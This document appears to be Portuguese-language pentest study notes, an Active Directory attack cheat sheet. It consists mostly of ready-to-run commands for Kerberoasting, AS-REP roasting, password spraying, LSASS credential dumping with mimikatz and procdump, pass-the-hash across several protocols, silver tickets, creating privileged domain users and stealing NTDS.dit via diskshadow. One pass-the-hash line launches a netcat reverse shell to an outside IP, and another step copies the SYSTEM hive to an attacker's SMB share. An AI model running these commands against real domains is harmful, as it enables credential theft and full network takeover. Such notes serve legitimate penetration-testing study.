Active Directory
========================

Aqui já podemos levar em conta que já temos uma credencial válida de domínio e, até podemos ter acesso a máquina, mas se não houver, podemos começar conforme os passos abaixo:

- [ ] [**Enumeração do domínio com bloodhound**](#enumeracao-do-dominio-com-bloodhound)
- [ ] [**Enumeração manual do domínio**](#enumeracao-manual)
    - [ ] [Enumerar usuários privilegiados](#enumerar-usuarios-privilegiados)
- [ ] [**AsRep Roasting**](#asrep-roasting) impacket ou Rubeus
- [ ] [**Password Spray**](#password-spray)
- [ ] [**Enumerar contas de serviço**](#enumerar-contas-de-servico)
- [ ] [**Kerberoasting**](#kerberoasting): impacket ou Rubeus
- [ ] [**Dump de hashes**](#lsass-dump)
- [ ] [**Pass the Hash**](#pass-the-hash)
- [ ] [**Over Pass the Hash**](#over-pass-the-hash)
- [ ] [**Silver Ticket**](#silver-ticket)
- [ ] [**Adicionar usuário privilegiado**](#adicionar-usuario-privilegiado)
- [ ] [**Permissionamento de usuário**](#permissionamento-de-usuario)
- [ ] [**Unconstrained delegation**](#unconstrained%20delegation)

## Enumeração do domínio com Bloodhound

Opção remota com bloodhound-python

```
bloodhound-python -u <usuario> -p <senha> -d <dominio.local> -v --zip -c All -dc <hostname_dc> -ns <ip_dns>
```

Opção local com SharpHound, sendo SharpHound.exe = sh.exe
```
    ./sh.exe -c all -d dominio.local --ldapusername <usuario> --ldappassword <senha>
```
Vale ressaltar que existe a possibilidade de executar esse comando de outras formas também e a maneira mais simples de fazâ-lo seria:

```
    ./sh.exe -c all
```

Cuidado com esses comandos em ambiente corporativo. Faz muito barulho!!!
</details>

<details markdown="1"><summary markdown="1">

Com essa sessão não é tão utilizada, optei por minimizar esse conteúdo

## Enumeracao Manual
</summary>

**oneliner(users)**

```
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Searcher.FindAll()
```

**users detailed information**

```
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"; $SearchString += $DistinguishedName; $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString); $objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="samAccountType=805306368";$Result = $Searcher.FindAll(); Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}Write-Host "------------------------"}
```

**oneliner (grupos)**

```
 $ldapFilter = "(objectClass=Group)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties.name}
```

**oneliner (sub grupos)**

```
 $ldapFilter = "(name=LAPS_Readers)";$domain = New-Object System.DirectoryServices.DirectoryEntry; $search = New-Object System.DirectoryServices.DirectorySearcher; $search.SearchRoot = $domain; $search.PageSize = 1000; $search.Filter = $ldapFilter; $search.SearchScope = "Subtree";$results = $search.FindAll();foreach ($result in $results){$result.Properties}
```

**Group members**

```
 $ldap_filter = "(name=LAPS_Readers)"; $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter=$ldap_filter;$Result = $Searcher.FindAll(); Foreach($obj in $Result) {$obj.Properties.member}
```

**Service Principal Names**

```
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain();$PDC = ($domainObj.PdcRoleOwner).Name;$SearchString = "LDAP://";$SearchString += $PDC + "/";$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))";$SearchString += $DistinguishedName;$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString);$objDomain = New-Object System.DirectoryServices.DirectoryEntry;$Searcher.SearchRoot = $objDomain;$Searcher.filter="serviceprincipalname=*";$Result = $Searcher.FindAll();Foreach($obj in $Result){Foreach($prop in $obj.Properties){$prop}}
 
```

### Enumerar usuários privilegiados

```
    $ldapFilter = "(&(objectclass=user)(memberof=CN=Domain Admins,CN=Users,DC=xor,DC=com))"
    $domain = New-Object System.DirectoryServices.DirectoryEntry
    $search = New-Object System.DirectoryServices.DirectorySearcher
    $search.SearchRoot = $domain
    $search.PageSize = 1000
    $search.Filter = $ldapFilter
    $search.SearchScope = "Subtree"
    #Execute Search
    $results = $search.FindAll()
    Foreach($obj in $results) {
      Foreach($prop in $obj.Properties){ 
          $prop
        }
    }
```

onde DC (no filtro, primeira linha do script) ali vai ser o nome do domínio que estamos analisando.
</details>

## AsRep Roasting

Com impacket

    impacket-GetNPUsers -usersfile usernames.txt -dc-host <hostname_dc> <dominio>

ou com Rubeus

    ./r.exe asreproast /domain:<dominio> /dc:<hostname_dc>

Depois, para quebrar o(s) hash(s):

    john --format=krb5asrep -w /usr/share/wordlists/rockyou.txt hashes_temp.txt

### Referência em vídeo

![type:video](https://youtube.com/embed/xNGfCADe9tk)

0:00 Introdução
0:30 Configuração necessária para explorar a vulnerabilidade
1:30 Configuração do ambiente de teste
3:45 Obtendo nome de domínio, hostname e ip do controlador de domínio
5:20 Explorando com Rubeus no Windows
6:10 Adequando o output da ferramenta
7:00 Quebrando o hash de senha com john
10:00 Utilizando o host comprometido como pivot para os demais hosts da rede
11:25 Configurando o Proxychains
14:25 Explorando com Impacket no Linux



## Password spray

```
crackmapexec ldap hosts.txt -u users.txt -p P@ssword! --continue

crackmapexec smb 10.10.11.152 -u users.txt -p passwords_test.txt --continue

crackmapexec winrm 10.10.11.152 -u users.txt -p passwords_test.txt --continue
```


## Enumerar contas de serviço

```
    setspn -F -Q */*
```

```
$ldapFilter = "(&(objectclass=user)(objectcategory=user)(servicePrincipalName=*))"
$domain = New-Object System.DirectoryServices.DirectoryEntry
$search = New-Object System.DirectoryServices.DirectorySearcher
$search.SearchRoot = $domain
$search.PageSize = 1000
$search.Filter = $ldapFilter
$search.SearchScope = "Subtree"
#Execute Search
$results = $search.FindAll()
#Display SPN values from the returned objects
foreach ($result in $results)
{
    $userEntry = $result.GetDirectoryEntry()
    Write-Host "User Name = " $userEntry.name
    foreach ($SPN in $userEntry.servicePrincipalName)
        {
            Write-Host "SPN = " $SPN      
        }
    Write-Host ""   
}
```

## Kerberoasting

Se atentar a este ponto, visto que enumerando localmente na máquina, são retornados vários SPNs pré configurados do próprio domínio. Temos que enumerar os que estão associados a uma conta de serviço (user), pois a probabilidade de ter uma senha fraca é maior.

Impacket

    impacket-GetUsersSPNs -request -dc-host <hostname_dc> <dominio/user:senha>

Rubeus

Rubeus.exe=r.exe

    ./r.exe kerberoast /domain:<domain.local> /dc:<hostname_dc>

ou

    ./r.exe kerberoast /outfile:kerberoastables.txt /domain:<dominio.local> /dc:<hostname_dc>
    hashcat -m 13100 -a 0 ticket.kirbi /usr/share/wordlists/rockyou.txt

Mimikatz

mimikatz.exe=m.exe

Verificando os tickets existentes na máquina

```
./m.exe
privilege::debug
sekurlsa::tickets
```
Requisitando os tickets na máquina:

```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList
'HTTP/dominio.serv.com'

klist
```
Pode ser que o comando não funcione pelo fato de a credencial não ter sido enviada pela rede, então temos de fazer o seguinte:
```
$pass = ConvertTo-SecureString '<senha>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('<dominio\usuario>',$pass)
get-domainspnticket -spn IMAP/EXCH01.htb.local -credential $cred
```
Depois de verificado por meio do klist que os tickets estão importados na memória, devemos utilizar o mimikatz para exportar eles:

```
./m.exe
privilege::debug
kerbertos::list /export
```
E para quebrar os hashes de senha, temos de fazer o seguinte:

```
python kirbi2john.py /path/file.kirbi > kirbi.john
john --wordlist=/usr/share/rockyou.txt kirbi.john
```
ou

    python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~dominio.com-dominio.com.kirbi

### Referência em vídeo

![type:video](https://youtube.com/embed/dZKelLeyEzQ)

[Introduçao ao kerberoast](https://www.youtube.com/watch?v=dZKelLeyEzQ&t=0s)  
[Configuração do ambiente](https://www.youtube.com/watch?v=dZKelLeyEzQ&t=55s)  
[Kerberoasting com Rubeus no Windows](https://www.youtube.com/watch?v=dZKelLeyEzQ&t=82s)  
[Encaminhamento de porta para chegar no Domain Controller pelo Kali Linux (port forwarding)](https://www.youtube.com/watch?v=dZKelLeyEzQ&t=260s)  
[Kerberoasting com Impacket no Kali Linux](https://www.youtube.com/watch?v=dZKelLeyEzQ&t=500s)  

## lsass dump

Esse ponto é importante, porque nos dará condições de fazer o ataque de pass-the-hash! O objetivo aqui é obter os hashes de senha dos usuários e informar esses hashes por meio dos comandos para conseguir se autenticar com um determinado procotolo, por exemplo. As possibilidades de extração de hashes são os seguintes...

mimikatz

    privilege::debug
    sekurlsa::logonPasswords
    lsadump::lsa /patch

procdump

    get-process lsass
    .\procdump -accepteula -ma 572 out.dmp
    #ou
    .\pd.exe -accepteula -ma lsass.exe lsass_dump
    #Then parse it with mimikatz
    mimikatz.exe
    sekurlsa::minidump out.dmp
    sekurlsa::logonpasswords
    #remotelly
    pypykatz lsa minidump lsass_dump.dmp

TaskManager

![qownnotes-media-jjlIpZ](../../media/qownnotes-media-jjlIpZ.png)

Crackmapexec

    crackmapexec smb 192.168.175.202 -u Administrator -H "<nt_hash>" --lsa

## Pass the hash


Localmente

Mimikatz

    sekurlsa::pth /user:user1 /domain:home.lab /ntlm:ae974876d974abd805a989ebead86846 /run:".\n.exe -e cmd 192.168.0.76 8089"

Remotamente

#### winrm

```
evil-winrm -i 10.10.10.103 -u Administrator -H f6b7160bfc91823792e0ac3a162c9267
```

#### RDP

    cme smb 10.0.0.200 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
    xfreerdp /v:192.168.2.200 /u:Administrator /pth:8846F7EAEE8FB117AD06BDD830B7586C


#### LDAP

python

    python3
    >>> import ldap3
    >>> user = 'DOMAIN\\EXCHANGE$'
    >>> password = 'aad3b435b51404eeaad3b435b51404ee:6216d3268ba7634e92313c8b60293248'
    >>> server = ldap3.Server('DOMAIN.LOCAL')
    from ldap3 import Server, Connection, SIMPLE, SYNC, ALL, SASL, NTLM
    connection = ldap3.Connection(server, user=user, password=password, authentication=NTLM)
    >>> connection.bind()
    >>> from ldap3.extend.microsoft.addMembersToGroups import ad_add_members_to_groups as addUsersInGroups
    >>> user_dn = 'CN=IT User,OU=Standard Accounts,DC=domain,DC=local'
    >>> group_dn = 'CN=Domain Admins,CN=Users,DC=domain,DC=local'
    >>> addUsersInGroups(connection, user_dn, group_dn)
    True

crackmapexec

    crackmapexec ldap 192.168.175.202 -u usuarios.txt -H "<nt_hash>"

#### WMI

    wmiexec.py domain.local/user@10.0.0.20 -hashes aad3b435b51404eeaad3b435b51404ee:BD1C6503987F8FF006296118F359FA79

#### SMB

    smbclient //10.0.0.30/Finance -U user --pw-nt-hash BD1C6503987F8FF006296118F359FA79 -W domain.local

    impacket-psexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267
    impacket-smbexec 'htb.local/Administrator@10.10.10.103' -hashes :f6b7160bfc91823792e0ac3a162c9267

Crackmapexec

    crackmapexec smb 192.168.175.202 -u Administrator -H "<nt_hash>" --lsa

  
## Over pass the hash

O objetivo aqui é para obter um ticket Kerberos, pois caso utilizamos algum recurso que não suporte o NTLM como autenticação, temos a opção de utilizar o ticket kerberos como autenticação.

Para fazer esse tipo de ataque de maneira remota, pordemos utilizar o impacket:

Primeiro requisitamos o TGT:

    impacket-getTGT -dc-ip <IP_do_DC> domain/user:password

ou

    impacket-getTGT -dc-ip <ip_dc> <domain/usuario> -hashes :<nt_hash>

Aqui teremos de [fazer a conversão da senha para o hash NT](#conversa-de-senha-em-texto-claro-para-nt-hash)

Aqui já teremos o .ccache e podemos carregar essa informação no Kali Linux da seguinte maneira:

    export KRB5NAME=/home/acosta/owncloud/Area_de_trabalho/estudos/hack_the_box/scrambled/Administrator.ccache

## Conversão de senha em texto claro para hash NT

    iconv -f ASCII -t UTF-16LE &#x3C;(printf "<senha>") | openssl dgst -md4

ou

    python -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4", "<senha>".encode("utf-16le")).digest()))'


Para conduzir esse ataque, primeiro temos que injetar na memória do nosso processo a credencial do nosso usuário administrativo, por exemplo:

    sekurlsa::pth /user:user1 /domain:home.lab /ntlm:ae974876d974abd805a989ebead86846 /run:".\n.exe -e cmd 192.168.0.76 8089"

Depois disso, temos de fazer uma requisição de rede de algum serviço para carregar o ticket kerberos na memória

    net use \\dc01.home.lab

**Fica como observação que não consegui reproduzir isso no laboratório**

## Silver Ticket

Impacket

    impacket-ticketer -spn 'MSSQLSvc/dc1.scrm.local:1433' -domain domain.name -domain-sid <domain_sid> -nthash <ntlm_da_senha_do_spn> -dc-ip <hostname_dc> adm


Mimikatz

Esse tipo de ataque é interessante para fazer lateralização, dado que vários servidores podem ter a mesma conta de serviço.


    ./m.exe
    kerberos::golden /user:<usuario> /domain:corp.com /sid:<sid_do_dominio> /target:<dominio.local> /service:HTTP /rc4:<nthash> /ptt

## Adicionar usuário privilegiado

    net user <usuario> <senha> /add /domain
    
Adicionando em um grupo privilegiado

    net localgroup Administrators /add <usuario>

ou em um grupo de domínio

    net group "Exchange Windows Permissions" /add <usuario>

## Permissionamento de usuário

Esse ponto consistem em obter os hashes de senha dos usuários do AD utilizando a permissão de usuário SeBackupPrivilege do usuário:

Detectamos isso com o comando:

    whoami /priv

![qownnotes-media-GRqaSH](../../../media/qownnotes-media-GRqaSH.png)

Depois disso, temos de criar um scriptizinho:

    cat test.dsh

```
set context persistent nowriters
add volume c: alias test
create
expose %test% z:
```

Adequando o arquivo para leitura correto do SO Windows:

    uni2dos test.dsh

fazer o upload do arquivo na máquina alvo e executar os seguintes comandos:

    diskshadow /s test.dsh
    robocopy /b z:\windows\ntds . ntds.dit
    

Fazer o download do arquivo ntds.dit para a máquina do atacante. Além deste arquivo, vamos precisar do SYSTEM tabém, que podemos obter por meio do seguinte comando:

(Se necessário, fornecer credencial):

    net use \\10.0.0.1\smb /user:test test

depois:

    reg save HKLM\SYSTEM \\10.0.0.1\smb\system



claro que temos que estar com o servidor smb de pé (se necessário, colocar senha e usuário):

    impacket-smbserver -smb2support smb .

ou

    impacket-smbserver -smb2support -username test -password test smb .

Assim que os arquivos necessários estiverem an máquina do atacante, considere o seguinte comando:

    impacket-secretsdump local -ntds ntds.dit -system system

## Unconstrained delegation

A premissa é achar uma máquina que possui "unconstrained delegation" ou unrestricted kerberos delegation" configurado, pois nela será salvo os TGTs de usuários que podemos utilizá-los para nos autenticar em outras máquinas:

Enumerando
```
Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
```

_Remotamente_

```
ldapsearch -LLL -x -H ldap://dc.support.htb -D "support@support.htb" -W -b "dc=support,dc=htb" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

```
ldapsearch -LLL -x -H ldap://pdc01.lab.ropnop.com -D "thoffman@lab.ropnop.com" -W -b "dc=lab,dc=ropnop,dc=com" "(&(objectCategory=computer)(objectClass=computer) userAccountControl:1.2.840.113556.1.4.80 3:=524288))"
```


Com powerview podemos utilizar o seguinte comando:

```
Get-DomainComputer -Unconstrained
```

Para enumerar os TGTs presentes na máquina, precisamos executar o mimikatz com os seguintes comandos:

```
mimikatz.exe
debug::privileges
sekurlsa::tickets
```

## Constrained delegation


(userAccountControl:1.2.840.113556.1.4.803:=524288)’